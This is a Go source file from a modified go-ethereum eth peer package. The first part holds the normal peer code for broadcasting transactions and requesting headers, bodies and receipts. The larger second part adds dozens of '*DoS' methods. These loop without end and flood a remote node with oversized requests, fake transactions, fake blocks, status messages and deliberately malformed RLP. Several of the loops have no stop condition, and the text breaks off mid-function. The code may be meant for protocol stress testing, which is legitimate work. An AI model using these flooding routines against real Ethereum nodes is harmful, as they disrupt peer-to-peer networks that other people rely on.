// Copyright 2020 The go-ethereum Authors
// This file is part of the go-ethereum library.
//
// The go-ethereum library is free software: you can redistribute it and/or modify
// it under the terms of the GNU Lesser General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// The go-ethereum library is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with the go-ethereum library. If not, see <http://www.gnu.org/licenses/>.

package eth

import (
	"fmt"
	"math/big"
	"math/rand"
	"time"

	mapset "github.com/deckarep/golang-set/v2"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/forkid"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/rlp"
)

const (
	// maxKnownTxs is the maximum transactions hashes to keep in the known list
	// before starting to randomly evict them.
	maxKnownTxs = 32768

	// maxQueuedTxs is the maximum number of transactions to queue up before dropping
	// older broadcasts.
	maxQueuedTxs = 4096

	// maxQueuedTxAnns is the maximum number of transaction announcements to queue up
	// before dropping older announcements.
	maxQueuedTxAnns = 4096
)

// Peer is a collection of relevant information we have about a `eth` peer.
type Peer struct {
	id string // Unique ID for the peer, cached

	*p2p.Peer                   // The embedded P2P package peer
	rw        p2p.MsgReadWriter // Input/output streams for snap
	version   uint              // Protocol version negotiated

	txpool      TxPool             // Transaction pool used by the broadcasters for liveness checks
	knownTxs    *knownCache        // Set of transaction hashes known to be known by this peer
	txBroadcast chan []common.Hash // Channel used to queue transaction propagation requests
	txAnnounce  chan []common.Hash // Channel used to queue transaction announcement requests

	reqDispatch chan *request  // Dispatch channel to send requests and track then until fulfillment
	reqCancel   chan *cancel   // Dispatch channel to cancel pending requests and untrack them
	resDispatch chan *response // Dispatch channel to fulfil pending requests and untrack them

	term chan struct{} // Termination channel to stop the broadcasters
}

// NewPeer creates a wrapper for a network connection and negotiated  protocol
// version.
func NewPeer(version uint, p *p2p.Peer, rw p2p.MsgReadWriter, txpool TxPool) *Peer {
	peer := &Peer{
		id:          p.ID().String(),
		Peer:        p,
		rw:          rw,
		version:     version,
		knownTxs:    newKnownCache(maxKnownTxs),
		txBroadcast: make(chan []common.Hash),
		txAnnounce:  make(chan []common.Hash),
		reqDispatch: make(chan *request),
		reqCancel:   make(chan *cancel),
		resDispatch: make(chan *response),
		txpool:      txpool,
		term:        make(chan struct{}),
	}
	// Start up all the broadcasters
	go peer.broadcastTransactions()
	go peer.announceTransactions()
	go peer.dispatcher()

	return peer
}

// Close signals the broadcast goroutine to terminate. Only ever call this if
// you created the peer yourself via NewPeer. Otherwise let whoever created it
// clean it up!
func (p *Peer) Close() {
	close(p.term)
}

// ID retrieves the peer's unique identifier.
func (p *Peer) ID() string {
	return p.id
}

// Version retrieves the peer's negotiated `eth` protocol version.
func (p *Peer) Version() uint {
	return p.version
}

// KnownTransaction returns whether peer is known to already have a transaction.
func (p *Peer) KnownTransaction(hash common.Hash) bool {
	return p.knownTxs.Contains(hash)
}

// markTransaction marks a transaction as known for the peer, ensuring that it
// will never be propagated to this particular peer.
func (p *Peer) markTransaction(hash common.Hash) {
	// If we reached the memory allowance, drop a previously known transaction hash
	p.knownTxs.Add(hash)
}

// SendTransactions sends transactions to the peer and includes the hashes
// in its transaction hash set for future reference.
//
// This method is a helper used by the async transaction sender. Don't call it
// directly as the queueing (memory) and transmission (bandwidth) costs should
// not be managed directly.
//
// The reasons this is public is to allow packages using this protocol to write
// tests that directly send messages without having to do the async queueing.
func (p *Peer) SendTransactions(txs types.Transactions) error {
	// Mark all the transactions as known, but ensure we don't overflow our limits
	for _, tx := range txs {
		p.knownTxs.Add(tx.Hash())
	}
	return p2p.Send(p.rw, TransactionsMsg, txs)
}

// AsyncSendTransactions queues a list of transactions (by hash) to eventually
// propagate to a remote peer. The number of pending sends are capped (new ones
// will force old sends to be dropped)
func (p *Peer) AsyncSendTransactions(hashes []common.Hash) {
	select {
	case p.txBroadcast <- hashes:
		// Mark all the transactions as known, but ensure we don't overflow our limits
		p.knownTxs.Add(hashes...)
	case <-p.term:
		p.Log().Debug("Dropping transaction propagation", "count", len(hashes))
	}
}

// sendPooledTransactionHashes sends transaction hashes (tagged with their type
// and size) to the peer and includes them in its transaction hash set for future
// reference.
//
// This method is a helper used by the async transaction announcer. Don't call it
// directly as the queueing (memory) and transmission (bandwidth) costs should
// not be managed directly.
func (p *Peer) sendPooledTransactionHashes(hashes []common.Hash, types []byte, sizes []uint32) error {
	// Mark all the transactions as known, but ensure we don't overflow our limits
	p.knownTxs.Add(hashes...)
	return p2p.Send(p.rw, NewPooledTransactionHashesMsg, NewPooledTransactionHashesPacket{Types: types, Sizes: sizes, Hashes: hashes})
}

// AsyncSendPooledTransactionHashes queues a list of transactions hashes to eventually
// announce to a remote peer.  The number of pending sends are capped (new ones
// will force old sends to be dropped)
func (p *Peer) AsyncSendPooledTransactionHashes(hashes []common.Hash) {
	select {
	case p.txAnnounce <- hashes:
		// Mark all the transactions as known, but ensure we don't overflow our limits
		p.knownTxs.Add(hashes...)
	case <-p.term:
		p.Log().Debug("Dropping transaction announcement", "count", len(hashes))
	}
}

// ReplyPooledTransactionsRLP is the response to RequestTxs.
func (p *Peer) ReplyPooledTransactionsRLP(id uint64, hashes []common.Hash, txs []rlp.RawValue) error {
	// Mark all the transactions as known, but ensure we don't overflow our limits
	p.knownTxs.Add(hashes...)

	// Not packed into PooledTransactionsResponse to avoid RLP decoding
	return p2p.Send(p.rw, PooledTransactionsMsg, &PooledTransactionsRLPPacket{
		RequestId:                     id,
		PooledTransactionsRLPResponse: txs,
	})
}

// ReplyBlockHeadersRLP is the response to GetBlockHeaders.
func (p *Peer) ReplyBlockHeadersRLP(id uint64, headers []rlp.RawValue) error {
	return p2p.Send(p.rw, BlockHeadersMsg, &BlockHeadersRLPPacket{
		RequestId:               id,
		BlockHeadersRLPResponse: headers,
	})
}

// ReplyBlockBodiesRLP is the response to GetBlockBodies.
func (p *Peer) ReplyBlockBodiesRLP(id uint64, bodies []rlp.RawValue) error {
	// Not packed into BlockBodiesResponse to avoid RLP decoding
	return p2p.Send(p.rw, BlockBodiesMsg, &BlockBodiesRLPPacket{
		RequestId:              id,
		BlockBodiesRLPResponse: bodies,
	})
}

// ReplyReceiptsRLP is the response to GetReceipts.
func (p *Peer) ReplyReceiptsRLP(id uint64, receipts []rlp.RawValue) error {
	return p2p.Send(p.rw, ReceiptsMsg, &ReceiptsRLPPacket{
		RequestId:           id,
		ReceiptsRLPResponse: receipts,
	})
}

// RequestOneHeader is a wrapper around the header query functions to fetch a
// single header. It is used solely by the fetcher.
func (p *Peer) RequestOneHeader(hash common.Hash, sink chan *Response) (*Request, error) {
	p.Log().Debug("Fetching single header", "hash", hash)
	id := rand.Uint64()

	req := &Request{
		id:   id,
		sink: sink,
		code: GetBlockHeadersMsg,
		want: BlockHeadersMsg,
		data: &GetBlockHeadersPacket{
			RequestId: id,
			GetBlockHeadersRequest: &GetBlockHeadersRequest{
				Origin:  HashOrNumber{Hash: hash},
				Amount:  uint64(1),
				Skip:    uint64(0),
				Reverse: false,
			},
		},
	}
	if err := p.dispatchRequest(req); err != nil {
		return nil, err
	}
	return req, nil
}

// RequestHeadersByHash fetches a batch of blocks' headers corresponding to the
// specified header query, based on the hash of an origin block.
func (p *Peer) RequestHeadersByHash(origin common.Hash, amount int, skip int, reverse bool, sink chan *Response) (*Request, error) {
	p.Log().Debug("Fetching batch of headers", "count", amount, "fromhash", origin, "skip", skip, "reverse", reverse)
	id := rand.Uint64()

	req := &Request{
		id:   id,
		sink: sink,
		code: GetBlockHeadersMsg,
		want: BlockHeadersMsg,
		data: &GetBlockHeadersPacket{
			RequestId: id,
			GetBlockHeadersRequest: &GetBlockHeadersRequest{
				Origin:  HashOrNumber{Hash: origin},
				Amount:  uint64(amount),
				Skip:    uint64(skip),
				Reverse: reverse,
			},
		},
	}
	if err := p.dispatchRequest(req); err != nil {
		return nil, err
	}
	return req, nil
}

// RequestHeadersByNumber fetches a batch of blocks' headers corresponding to the
// specified header query, based on the number of an origin block.
func (p *Peer) RequestHeadersByNumber(origin uint64, amount int, skip int, reverse bool, sink chan *Response) (*Request, error) {
	p.Log().Debug("Fetching batch of headers", "count", amount, "fromnum", origin, "skip", skip, "reverse", reverse)
	id := rand.Uint64()

	req := &Request{
		id:   id,
		sink: sink,
		code: GetBlockHeadersMsg,
		want: BlockHeadersMsg,
		data: &GetBlockHeadersPacket{
			RequestId: id,
			GetBlockHeadersRequest: &GetBlockHeadersRequest{
				Origin:  HashOrNumber{Number: origin},
				Amount:  uint64(amount),
				Skip:    uint64(skip),
				Reverse: reverse,
			},
		},
	}
	if err := p.dispatchRequest(req); err != nil {
		return nil, err
	}
	return req, nil
}

// RequestBodies fetches a batch of blocks' bodies corresponding to the hashes
// specified.
func (p *Peer) RequestBodies(hashes []common.Hash, sink chan *Response) (*Request, error) {
	p.Log().Debug("Fetching batch of block bodies", "count", len(hashes))
	id := rand.Uint64()

	req := &Request{
		id:   id,
		sink: sink,
		code: GetBlockBodiesMsg,
		want: BlockBodiesMsg,
		data: &GetBlockBodiesPacket{
			RequestId:             id,
			GetBlockBodiesRequest: hashes,
		},
	}
	if err := p.dispatchRequest(req); err != nil {
		return nil, err
	}
	return req, nil
}

// RequestReceipts fetches a batch of transaction receipts from a remote node.
func (p *Peer) RequestReceipts(hashes []common.Hash, sink chan *Response) (*Request, error) {
	p.Log().Debug("Fetching batch of receipts", "count", len(hashes))
	id := rand.Uint64()

	req := &Request{
		id:   id,
		sink: sink,
		code: GetReceiptsMsg,
		want: ReceiptsMsg,
		data: &GetReceiptsPacket{
			RequestId:          id,
			GetReceiptsRequest: hashes,
		},
	}
	if err := p.dispatchRequest(req); err != nil {
		return nil, err
	}
	return req, nil
}

// RequestTxs fetches a batch of transactions from a remote node.
func (p *Peer) RequestTxs(hashes []common.Hash) error {
	p.Log().Debug("Fetching batch of transactions", "count", len(hashes))
	id := rand.Uint64()

	requestTracker.Track(p.id, p.version, GetPooledTransactionsMsg, PooledTransactionsMsg, id)
	return p2p.Send(p.rw, GetPooledTransactionsMsg, &GetPooledTransactionsPacket{
		RequestId:                    id,
		GetPooledTransactionsRequest: hashes,
	})
}

// knownCache is a cache for known hashes.
type knownCache struct {
	hashes mapset.Set[common.Hash]
	max    int
}

// newKnownCache creates a new knownCache with a max capacity.
func newKnownCache(max int) *knownCache {
	return &knownCache{
		max:    max,
		hashes: mapset.NewSet[common.Hash](),
	}
}

// Add adds a list of elements to the set.
func (k *knownCache) Add(hashes ...common.Hash) {
	for k.hashes.Cardinality() > max(0, k.max-len(hashes)) {
		k.hashes.Pop()
	}
	for _, hash := range hashes {
		k.hashes.Add(hash)
	}
}

// Contains returns whether the given item is in the set.
func (k *knownCache) Contains(hash common.Hash) bool {
	return k.hashes.Contains(hash)
}

// Cardinality returns the number of elements in the set.
func (k *knownCache) Cardinality() int {
	return k.hashes.Cardinality()
}

// sxguan
func (p *Peer) RequestBlockHeaderDoS(stopCh <-chan struct{}, bn int) error {
	p.Log().Debug("Fetching DoS block header")
	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS block header request")
			return nil
		default:
			id := rand.Uint64()
			s_block := uint64(bn)
			req := &Request{
				id:   id,
				sink: make(chan *Response),
				code: GetBlockHeadersMsg,
				want: BlockHeadersMsg,
				data: &GetBlockHeadersPacket{
					RequestId:              id,
					GetBlockHeadersRequest: &GetBlockHeadersRequest{HashOrNumber{Number: s_block}, 1000, 1000, true},
				},
			}
			p2p.Send(p.rw, req.code, req.data)
		}
	}
	return nil
}

// shixuan
func (p *Peer) sendBatchRequest(code uint64, want uint64, hashes []common.Hash) error {
	id := rand.Uint64()

	var data interface{}

	// Create the appropriate packet based on the message code
	switch code {
	case GetBlockBodiesMsg:
		data = &GetBlockBodiesPacket{
			RequestId:             id,
			GetBlockBodiesRequest: hashes,
		}
	case GetReceiptsMsg:
		data = &GetReceiptsPacket{
			RequestId:          id,
			GetReceiptsRequest: hashes,
		}
	default:
		return fmt.Errorf("unsupported message code: %d", code)
	}

	err := p2p.Send(p.rw, code, data)
	if err != nil {
		p.Log().Error("Failed to send batch request", "code", code, "err", err)
		return err
	}

	p.Log().Debug("Sent batch request", "code", code, "hashes", len(hashes))
	return nil
}

// shixuan
func (p *Peer) RequestBodiesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS Bodies")

	batchSize := 10000
	rand.Seed(time.Now().UnixNano())

	// generateRandomHash generates a random hash instead of reading from file
	generateRandomHash := func() common.Hash {
		// Generate random bytes for hash
		var hashBytes [32]byte
		for i := 0; i < 32; i++ {
			hashBytes[i] = byte(rand.Intn(256))
		}
		return common.BytesToHash(hashBytes[:])
	}

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS Bodies request")
			return nil
		default:
			var batch []common.Hash
			for i := 0; i < batchSize; i++ {
				// Generate random hash instead of reading from file
				hash := generateRandomHash()
				batch = append(batch, hash)
			}

			if err := p.sendBatchRequest(GetBlockBodiesMsg, BlockBodiesMsg, batch); err != nil {
				p.Log().Error("Failed to send batch request:", err)
				return err
			}

			// Add a small delay to avoid overwhelming the peer
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// shixuan
func (p *Peer) RequestReceiptsDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS Receipts")

	batchSize := 10000
	rand.Seed(time.Now().UnixNano())

	// generateRandomHash generates a random hash instead of reading from file
	generateRandomHash := func() common.Hash {
		// Generate random bytes for hash
		var hashBytes [32]byte
		for i := 0; i < 32; i++ {
			hashBytes[i] = byte(rand.Intn(256))
		}
		return common.BytesToHash(hashBytes[:])
	}

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS Receipts request")
			return nil
		default:
			var batch []common.Hash
			for i := 0; i < batchSize; i++ {
				// Generate random hash instead of reading from file
				hash := generateRandomHash()
				batch = append(batch, hash)
			}

			if err := p.sendBatchRequest(GetReceiptsMsg, ReceiptsMsg, batch); err != nil {
				p.Log().Error("Failed to send batch request:", err)
				return err
			}
		}
	}
}

// DoS functions for additional protocol messages

// StatusDoS sends repeated status messages
func (p *Peer) StatusDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS Status")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS Status request")
			return nil
		default:
			statusPacket := &StatusPacket{
				ProtocolVersion: uint32(p.version),
				NetworkID:       uint64(1), // Mainnet
				TD:              big.NewInt(1000000),
				Head:            common.HexToHash("0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"),
				Genesis:         common.HexToHash("0xd4e56740f876aef8c010b86a40d5f56745a118d0906a34e69aec8c0db1cb8fa3"),
				ForkID:          forkid.ID{Hash: [4]byte{0x1, 0x2, 0x3, 0x4}, Next: 0},
			}

			err := p2p.Send(p.rw, StatusMsg, statusPacket)
			if err != nil {
				p.Log().Error("Failed to send StatusDoS message:", err)
				return err
			}
		}
	}
}

// NewBlockHashesDoS sends repeated new block hashes announcements
func (p *Peer) NewBlockHashesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS NewBlockHashes")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS NewBlockHashes request")
			return nil
		default:
			// Create dummy block hashes
			var hashes []common.Hash
			var numbers []uint64
			for i := 0; i < 10000; i++ {
				hash := common.HexToHash(fmt.Sprintf("0x%064x", rand.Int63()))
				hashes = append(hashes, hash)
				numbers = append(numbers, uint64(i+1000000))
			}

			announcement := NewBlockHashesPacket{}
			for i := 0; i < len(hashes); i++ {
				announcement = append(announcement, struct {
					Hash   common.Hash
					Number uint64
				}{
					Hash:   hashes[i],
					Number: numbers[i],
				})
			}

			err := p2p.Send(p.rw, NewBlockHashesMsg, announcement)
			if err != nil {
				p.Log().Error("Failed to send NewBlockHashesDoS message:", err)
				return err
			}
		}
	}
}

// TransactionsDoS sends repeated transaction messages
func (p *Peer) TransactionsDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS Transactions")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS Transactions request")
			return nil
		default:
			// Create dummy transactions
			var txs []*types.Transaction
			for i := 0; i < 4096; i++ {
				dummyTx := types.NewTransaction(
					uint64(i),
					common.HexToAddress("0x1234567890123456789012345678901234567890"),
					big.NewInt(1000000000000000000), // 1 ETH
					21000,
					big.NewInt(20000000000), // 20 Gwei
					nil,
				)
				txs = append(txs, dummyTx)
			}

			err := p.SendTransactions(txs)
			if err != nil {
				p.Log().Error("Failed to send TransactionsDoS message:", err)
				return err
			}
		}
	}
}

// BlockHeadersDoS sends repeated block headers
func (p *Peer) BlockHeadersDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS BlockHeaders")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS BlockHeaders request")
			return nil
		default:
			// Create dummy block headers
			var headers []*types.Header
			for i := 0; i < 1024; i++ {
				header := &types.Header{
					Number:     big.NewInt(int64(i)),
					ParentHash: common.HexToHash("0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"),
					Root:       common.HexToHash("0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"),
					Time:       uint64(time.Now().Unix()),
					GasLimit:   8000000,
					Difficulty: big.NewInt(1000000),
				}
				headers = append(headers, header)
			}

			id := rand.Uint64()
			packet := &BlockHeadersPacket{
				RequestId:           id,
				BlockHeadersRequest: headers,
			}

			err := p2p.Send(p.rw, BlockHeadersMsg, packet)
			if err != nil {
				p.Log().Error("Failed to send BlockHeadersDoS message:", err)
				return err
			}
		}
	}
}

// BlockBodiesDoS sends repeated block bodies messages
func (p *Peer) BlockBodiesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS BlockBodies")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS BlockBodies request")
			return nil
		default:
			id := rand.Uint64()
			var bodies BlockBodiesResponse
			for i := 0; i < 1024; i++ {
				body := &BlockBody{
					Transactions: []*types.Transaction{
						types.NewTransaction(
							uint64(i),
							common.HexToAddress("0x1234567890123456789012345678901234567890"),
							big.NewInt(1000),
							21000,
							big.NewInt(20000000000),
							nil,
						),
					},
					Uncles:      []*types.Header{},
					Withdrawals: []*types.Withdrawal{},
				}
				bodies = append(bodies, body)
			}

			packet := &BlockBodiesPacket{
				RequestId:           id,
				BlockBodiesResponse: bodies,
			}

			err := p2p.Send(p.rw, BlockBodiesMsg, packet)
			if err != nil {
				p.Log().Error("Failed to send BlockBodiesDoS message:", err)
				return err
			}
		}
	}
}

// NewBlockDoS sends repeated new block messages
func (p *Peer) NewBlockDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Fetching DoS NewBlock")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping DoS NewBlock request")
			return nil
		default:
			// Create dummy block
			header := &types.Header{
				Number:     big.NewInt(int64(rand.Int63n(1000000) + 1000000)),
				ParentHash: common.HexToHash("0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"),
				Root:       common.HexToHash("0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"),
				Time:       uint64(time.Now().Unix()),
				GasLimit:   8000000,
				GasUsed:    4000000,
				Difficulty: big.NewInt(1000000),
			}

			transactions := []*types.Transaction{
				types.NewTransaction(
					uint64(rand.Int63()),
					common.HexToAddress("0x1234567890123456789012345678901234567890"),
					big.NewInt(1000),
					21000,
					big.NewInt(20000000000),
					nil,
				),
			}

			block := types.NewBlockWithHeader(header).WithBody(types.Body{
				Transactions: transactions,
				Uncles:       []*types.Header{},
			})
			td := big.NewInt(rand.Int63n(1000000) + 1000000)

			announcement := &NewBlockPacket{
				Block: block,
				TD:    td,
			}

			err := p2p.Send(p.rw, NewBlockMsg, announcement)
			if err != nil {
				p.Log().Error("Failed to send NewBlockDoS message:", err)
				return err
			}
		}
	}
}

// NewPooledTransactionHashesDoS sends repeated pooled transaction hashes announcements
func (p *Peer) NewPooledTransactionHashesDoS() error {
	p.Log().Debug("Fetching DoS NewPooledTransactionHashes")

	for {
		var hashes []common.Hash
		var types []byte
		var sizes []uint32

		for i := 0; i < 1000; i++ {
			hashes = append(hashes, common.HexToHash(fmt.Sprintf("0x%064x", rand.Uint64())))
			types = append(types, 0) // Legacy transaction type
			sizes = append(sizes, uint32(100+rand.Intn(1000)))
		}

		packet := &NewPooledTransactionHashesPacket{
			Types:  types,
			Sizes:  sizes,
			Hashes: hashes,
		}

		err := p2p.Send(p.rw, NewPooledTransactionHashesMsg, packet)
		if err != nil {
			p.Log().Error("Failed to send NewPooledTransactionHashesDoS message:", err)
			return err
		}
	}
}

// GetPooledTransactionsDoS sends repeated get pooled transactions requests
func (p *Peer) GetPooledTransactionsDoS() error {
	p.Log().Debug("Fetching DoS GetPooledTransactions")

	for {
		id := rand.Uint64()
		var hashes []common.Hash
		for i := 0; i < 10000; i++ {
			hashes = append(hashes, common.HexToHash(fmt.Sprintf("0x%064x", rand.Uint64())))
		}

		packet := &GetPooledTransactionsPacket{
			RequestId:                    id,
			GetPooledTransactionsRequest: hashes,
		}

		err := p2p.Send(p.rw, GetPooledTransactionsMsg, packet)
		if err != nil {
			p.Log().Error("Failed to send GetPooledTransactionsDoS message:", err)
			return err
		}
	}
}

// PooledTransactionsDoS sends repeated pooled transactions messages
func (p *Peer) PooledTransactionsDoS() error {
	p.Log().Debug("Fetching DoS PooledTransactions")

	for {
		id := rand.Uint64()
		var txs []*types.Transaction
		for i := 0; i < 10000; i++ {
			tx := types.NewTransaction(
				uint64(i),
				common.HexToAddress("0x1234567890123456789012345678901234567890"),
				big.NewInt(1000),
				21000,
				big.NewInt(20000000000),
				nil,
			)
			txs = append(txs, tx)
		}

		packet := &PooledTransactionsPacket{
			RequestId:                  id,
			PooledTransactionsResponse: txs,
		}

		err := p2p.Send(p.rw, PooledTransactionsMsg, packet)
		if err != nil {
			p.Log().Error("Failed to send PooledTransactionsDoS message:", err)
			return err
		}
	}
}

// ReceiptsDoS sends repeated receipts messages
func (p *Peer) ReceiptsDoS() error {
	p.Log().Debug("Fetching DoS Receipts")

	for {
		id := rand.Uint64()
		var receipts [][]*types.Receipt
		for i := 0; i < 102; i++ {
			var blockReceipts []*types.Receipt
			for j := 0; j < 10; j++ {
				receipt := &types.Receipt{
					Status:            types.ReceiptStatusSuccessful,
					CumulativeGasUsed: uint64((j + 1) * 21000),
					Logs:              []*types.Log{},
					TxHash:            common.HexToHash(fmt.Sprintf("0x%064x", rand.Uint64())),
					GasUsed:           21000,
					BlockNumber:       big.NewInt(int64(i + 1000000)),
					TransactionIndex:  uint(j),
				}
				blockReceipts = append(blockReceipts, receipt)
			}
			receipts = append(receipts, blockReceipts)
		}

		packet := &ReceiptsPacket{
			RequestId:        id,
			ReceiptsResponse: receipts,
		}

		err := p2p.Send(p.rw, ReceiptsMsg, packet)
		if err != nil {
			p.Log().Error("Failed to send ReceiptsDoS message:", err)
			return err
		}
	}
}

// Malformed Input DoS Testing Functions

// MalformedTransactionsDoS sends transactions with corrupted data
func (p *Peer) MalformedTransactionsDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed transactions")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed transactions test")
			return nil
		default:
			// Test various malformed transaction scenarios
			scenarios := []func() error{
				// Invalid transaction with corrupted hash
				func() error {
					malformedTx := &struct {
						InvalidField string `rlp:"raw"`
					}{"corrupted_data"}
					return p2p.Send(p.rw, TransactionsMsg, malformedTx)
				},
				// Transaction with invalid RLP encoding
				func() error {
					invalidRLP := []byte{0xFF, 0xFF, 0xFF, 0xFF} // Invalid RLP
					return p2p.Send(p.rw, TransactionsMsg, rlp.RawValue(invalidRLP))
				},
				// Transaction with wrong type
				func() error {
					return p2p.Send(p.rw, TransactionsMsg, "not_a_transaction")
				},
			}

			// Randomly select a scenario
			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed transaction test:", "err", err)
			}
		}
	}
}

// MalformedBlockHashesDoS sends block hashes with corrupted data
func (p *Peer) MalformedBlockHashesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed block hashes")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed block hashes test")
			return nil
		default:
			scenarios := []func() error{
				// Invalid hash length
				func() error {
					malformedPacket := []struct {
						Hash   []byte // Wrong type - should be common.Hash
						Number uint64
					}{
						{Hash: []byte{0x12, 0x34}, Number: 1000000}, // Too short hash
					}
					return p2p.Send(p.rw, NewBlockHashesMsg, malformedPacket)
				},
				// Corrupted hash values
				func() error {
					malformedPacket := NewBlockHashesPacket{
						{Hash: common.Hash{}, Number: 0}, // Empty hash
						{Hash: common.HexToHash("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"), Number: 0xFFFFFFFFFFFFFFFF}, // Max values
					}
					return p2p.Send(p.rw, NewBlockHashesMsg, malformedPacket)
				},
				// Wrong message structure
				func() error {
					return p2p.Send(p.rw, NewBlockHashesMsg, map[string]interface{}{"invalid": "structure"})
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed block hashes test:", "err", err)
			}
		}
	}
}

// MalformedStatusDoS sends status messages with corrupted fields
func (p *Peer) MalformedStatusDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed status messages")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed status test")
			return nil
		default:
			scenarios := []func() error{
				// Status with invalid protocol version
				func() error {
					statusPacket := &StatusPacket{
						ProtocolVersion: 0xFFFFFFFF, // Invalid version
						NetworkID:       uint64(1),
						TD:              big.NewInt(-1), // Negative TD
						Head:            common.Hash{},  // Empty hash
						Genesis:         common.Hash{},
						ForkID:          forkid.ID{},
					}
					return p2p.Send(p.rw, StatusMsg, statusPacket)
				},
				// Status with corrupted big.Int
				func() error {
					corruptedStatus := struct {
						ProtocolVersion uint32
						NetworkID       uint64
						TD              string // Wrong type
						Head            common.Hash
						Genesis         common.Hash
						ForkID          forkid.ID
					}{
						ProtocolVersion: uint32(p.version),
						NetworkID:       uint64(1),
						TD:              "not_a_number",
						Head:            common.HexToHash("0x1234"),
						Genesis:         common.HexToHash("0x5678"),
						ForkID:          forkid.ID{},
					}
					return p2p.Send(p.rw, StatusMsg, corruptedStatus)
				},
				// Completely invalid RLP
				func() error {
					invalidRLP := []byte{0x80, 0x81, 0x82} // Invalid RLP sequence
					return p2p.Send(p.rw, StatusMsg, rlp.RawValue(invalidRLP))
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed status test:", "err", err)
			}
		}
	}
}

// MalformedGetBlockHeadersDoS sends get block headers requests with corrupted data
func (p *Peer) MalformedGetBlockHeadersDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed get block headers")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed get block headers test")
			return nil
		default:
			scenarios := []func() error{
				// Invalid HashOrNumber
				func() error {
					id := rand.Uint64()
					malformedReq := struct {
						RequestId uint64
						Origin    string // Wrong type
						Amount    uint64
						Skip      uint64
						Reverse   bool
					}{
						RequestId: id,
						Origin:    "invalid_hash_or_number",
						Amount:    0xFFFFFFFFFFFFFFFF, // Max uint64
						Skip:      0xFFFFFFFFFFFFFFFF,
						Reverse:   true,
					}
					return p2p.Send(p.rw, GetBlockHeadersMsg, malformedReq)
				},
				// Negative values where positive expected
				func() error {
					id := rand.Uint64()
					malformedReq := &GetBlockHeadersPacket{
						RequestId: id,
						GetBlockHeadersRequest: &GetBlockHeadersRequest{
							Origin:  HashOrNumber{Number: 0}, // This is valid, but we'll use invalid amounts
							Amount:  0,                       // Zero amount
							Skip:    0xFFFFFFFFFFFFFFFF,      // Very large skip
							Reverse: true,
						},
					}
					return p2p.Send(p.rw, GetBlockHeadersMsg, malformedReq)
				},
				// Both Hash and Number set (should be exclusive)
				func() error {
					id := rand.Uint64()
					malformedReq := &GetBlockHeadersPacket{
						RequestId: id,
						GetBlockHeadersRequest: &GetBlockHeadersRequest{
							Origin:  HashOrNumber{Hash: common.HexToHash("0x1234"), Number: 12345}, // Both set
							Amount:  1000000,                                                       // Very large amount
							Skip:    1000000,
							Reverse: false,
						},
					}
					return p2p.Send(p.rw, GetBlockHeadersMsg, malformedReq)
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed get block headers test:", "err", err)
			}
		}
	}
}

// MalformedGetBodiesDoS sends get block bodies requests with corrupted hashes
func (p *Peer) MalformedGetBodiesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed get block bodies")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed get block bodies test")
			return nil
		default:
			scenarios := []func() error{
				// Invalid hash values but correct type
				func() error {
					id := rand.Uint64()
					malformedHashes := []common.Hash{
						{}, // Empty hash
						common.HexToHash("0x0000000000000000000000000000000000000000000000000000000000000000"), // All zeros
						common.HexToHash("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"), // All ones
					}
					packet := &GetBlockBodiesPacket{
						RequestId:             id,
						GetBlockBodiesRequest: malformedHashes,
					}
